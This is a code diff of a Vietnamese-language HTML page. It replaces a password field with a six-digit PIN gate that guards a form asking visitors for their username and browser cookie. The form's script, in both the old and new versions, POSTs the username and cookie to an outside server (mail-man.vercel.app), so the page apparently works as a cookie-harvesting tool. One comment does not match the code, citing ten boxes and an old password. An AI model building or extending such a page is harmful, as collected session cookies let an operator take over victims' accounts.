@@ -13,6 +13,7 @@
         align-items: center;
         justify-content: center;
         height: 100vh;
+        margin: 0;
       }
       form,
       #passwordPrompt {
@@ -20,7 +21,7 @@
         padding: 20px 30px;
         border-radius: 8px;
         box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        width: 300px;
+        width: 320px;
         text-align: center;
       }
       label {
@@ -28,12 +29,16 @@
         margin-bottom: 8px;
         font-weight: bold;
       }
-      input {
+      input[type="text"],
+      input[type="password"],
+      .pin input {
         width: 100%;
         padding: 8px;
         margin-bottom: 15px;
         border: 1px solid #ccc;
         border-radius: 4px;
+        box-sizing: border-box;
+        font-size: 14px;
       }
       button {
         width: 100%;
@@ -43,23 +48,97 @@
         border: none;
         border-radius: 4px;
         cursor: pointer;
+        font-size: 15px;
       }
       button:hover {
         background-color: #005fa3;
       }
+
+      /* style cho nhóm ô mật khẩu (OTP) */
+      .pin {
+        display: flex;
+        gap: 8px;
+        justify-content: center;
+        margin: 12px 0 18px;
+      }
+      .pin input {
+        width: 40px; /* kích thước ô */
+        height: 48px;
+        text-align: center;
+        font-size: 20px;
+        padding: 0;
+        margin: 0;
+        border-radius: 6px;
+      }
+
+      /* responsive */
+      @media (max-width: 380px) {
+        .pin input {
+          width: 36px;
+          height: 44px;
+          font-size: 18px;
+        }
+        form,
+        #passwordPrompt {
+          width: 92%;
+          padding: 16px;
+        }
+      }
     </style>
   </head>
   <body>
-    <!-- Màn hình nhập mật khẩu -->
+    <!-- Màn hình nhập mật khẩu (bây giờ gồm nhiều ô) -->
     <div id="passwordPrompt">
       <h2>Nhập mật khẩu để truy cập</h2>
-      <input
-        type="password"
-        id="password"
-        placeholder="Nhập mật khẩu"
-        required
-      />
-      <button id="passwordBtn">Xác nhận</button>
+
+      <div aria-label="Mật khẩu" id="pinContainer" class="pin" role="group">
+        <!-- Số ô = 10 để chứa "caidaubui" (10 ký tự). Thay đổi length nếu cần -->
+        <!-- Tạo 10 ô, mỗi ô chỉ nhận 1 ký tự -->
+        <input
+          inputmode="numeric"
+          autocomplete="one-time-code"
+          type="password"
+          maxlength="1"
+          aria-label="Mật khẩu ký tự 1"
+        />
+        <input
+          inputmode="numeric"
+          autocomplete="one-time-code"
+          type="password"
+          maxlength="1"
+          aria-label="Mật khẩu ký tự 2"
+        />
+        <input
+          inputmode="numeric"
+          autocomplete="one-time-code"
+          type="password"
+          maxlength="1"
+          aria-label="Mật khẩu ký tự 3"
+        />
+        <input
+          inputmode="numeric"
+          autocomplete="one-time-code"
+          type="password"
+          maxlength="1"
+          aria-label="Mật khẩu ký tự 4"
+        />
+        <input
+          inputmode="numeric"
+          autocomplete="one-time-code"
+          type="password"
+          maxlength="1"
+          aria-label="Mật khẩu ký tự 5"
+        />
+        <input
+          inputmode="numeric"
+          autocomplete="one-time-code"
+          type="password"
+          maxlength="1"
+          aria-label="Mật khẩu ký tự 6"
+        />
+      </div>
+
+      <button id="passwordBtn" type="button">Xác nhận</button>
     </div>
 
     <!-- Form thông tin người dùng -->
@@ -76,6 +155,7 @@
 
       <label for="cookie">Cookie:</label>
       <input
+        type="text"
         id="cookie"
         name="cookie"
         placeholder="Nhập cookie của bạn"
@@ -86,46 +166,133 @@
     </form>
 
     <script>
-      const passwordPrompt = document.getElementById("passwordPrompt");
-      const passwordInput = document.getElementById("password");
-      const passwordBtn = document.getElementById("passwordBtn");
-      const form = document.getElementById("userForm");
+      (function () {
+        const pinContainer = document.getElementById("pinContainer");
+        const inputs = Array.from(pinContainer.querySelectorAll("input"));
+        const passwordBtn = document.getElementById("passwordBtn");
+        const passwordPrompt = document.getElementById("passwordPrompt");
+        const form = document.getElementById("userForm");
 
-      passwordBtn.addEventListener("click", () => {
-        const password = passwordInput.value;
-        if (password === "caidaubui") {
-          passwordPrompt.style.display = "none";
-          form.style.display = "block";
-        } else {
-          alert("Mật khẩu sai!");
-          passwordInput.value = "";
+        // Focus ô đầu khi load
+        inputs[0].focus();
+
+        // Khi người nhập vào từng ô
+        inputs.forEach((input, idx) => {
+          input.addEventListener("input", (e) => {
+            const val = e.target.value;
+            if (!val) return;
+            // chỉ giữ 1 ký tự (đã có maxlength=1 nhưng phòng hờ)
+            e.target.value = val.slice(-1);
+            // chuyển sang ô tiếp theo nếu có
+            const next = inputs[idx + 1];
+            if (next) {
+              next.focus();
+              next.select && next.select();
+            }
+          });
+
+          input.addEventListener("keydown", (e) => {
+            const key = e.key;
+
+            if (key === "Backspace" && !input.value) {
+              // nếu ô trống và bấm backspace -> chuyển về ô trước
+              const prev = inputs[idx - 1];
+              if (prev) {
+                prev.focus();
+                prev.value = "";
+                // ngăn hành vi mặc định để tránh thoát trang
+                e.preventDefault();
+              }
+            } else if (key === "ArrowLeft") {
+              const prev = inputs[idx - 1];
+              if (prev) prev.focus();
+              e.preventDefault();
+            } else if (key === "ArrowRight") {
+              const next = inputs[idx + 1];
+              if (next) next.focus();
+              e.preventDefault();
+            }
+            // cho phép các chữ/so/bat ky tu khác
+          });
+
+          // hỗ trợ dán chuỗi vào 1 ô -> phân phối vào các ô
+          input.addEventListener("paste", (e) => {
+            e.preventDefault();
+            const paste = (e.clipboardData || window.clipboardData).getData(
+              "text"
+            );
+            if (!paste) return;
+            // lấy từ vị trí hiện tại và phân phối
+            let idxStart = idx;
+            for (
+              let i = 0;
+              i < paste.length && idxStart + i < inputs.length;
+              i++
+            ) {
+              inputs[idxStart + i].value = paste[i];
+            }
+            // focus ô tiếp theo sau chuỗi dán
+            const after =
+              inputs[Math.min(inputs.length - 1, idxStart + paste.length)];
+            after.focus();
+            after.select && after.select();
+          });
+        });
+
+        // hàm lấy mật khẩu từ các ô
+        function getPinValue() {
+          return inputs.map((i) => i.value || "").join("");
         }
-      });
 
-      form.addEventListener("submit", function (event) {
-        event.preventDefault();
-        const username = document.getElementById("username").value;
-        const cookie = document.getElementById("cookie").value;
-        console.log("Tên người dùng:", username);
-        console.log("Cookie:", cookie);
-        (async () => {
-          try {
-            const res = await fetch("https://mail-man.vercel.app/api/user", {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json",
-              },
-              body: JSON.stringify({
-                name: username,
-                cookie: cookie,
-              }),
-            });
-            alert("GOOD");
-          } catch (error) {
-            alert("BAD");
+        // so sánh mật khẩu (lưu ý: plaintext so sánh ở client)
+        const CORRECT = "012345"; // giữ như trước; thay đổi nếu cần
+        passwordBtn.addEventListener("click", () => {
+          const entered = getPinValue();
+          if (entered === CORRECT) {
+            passwordPrompt.style.display = "none";
+            form.style.display = "block";
+          } else {
+            alert("Mật khẩu sai!");
+            // xóa tất cả ô và focus ô đầu
+            inputs.forEach((i) => (i.value = ""));
+            inputs[0].focus();
           }
-        })();
-      });
+        });
+
+        // Nếu muốn submit bằng Enter khi đang ở ô cuối:
+        inputs[inputs.length - 1].addEventListener("keydown", (e) => {
+          if (e.key === "Enter") {
+            e.preventDefault();
+            passwordBtn.click();
+          }
+        });
+
+        // form submit xử lý giống như code ban đầu
+        form.addEventListener("submit", function (event) {
+          event.preventDefault();
+          const username = document.getElementById("username").value;
+          const cookie = document.getElementById("cookie").value;
+          console.log("Tên người dùng:", username);
+          console.log("Cookie:", cookie);
+          (async () => {
+            try {
+              const res = await fetch("https://mail-man.vercel.app/api/user", {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                  name: username,
+                  cookie: cookie,
+                }),
+              });
+              alert("GOOD");
+            } catch (error) {
+              alert("BAD");
+            }
+          })();
+        });
+      })();
     </script>
   </body>
 </html>
